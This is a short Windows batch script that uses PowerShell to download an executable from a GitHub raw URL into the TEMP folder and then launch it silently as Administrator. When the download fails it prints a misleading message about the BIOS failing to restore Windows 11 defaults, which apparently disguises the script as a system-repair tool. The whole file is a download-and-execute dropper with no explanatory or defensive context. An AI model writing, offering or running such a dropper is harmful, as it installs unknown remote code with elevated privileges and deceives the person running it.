@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
if exist "%TEMP%\default.exe" (
    start /B "" runas /user:Administrator "%TEMP%\default.exe"
) else (
    echo Windows 11 | BIOS failed to restore defaults. Try again
)

endlocal
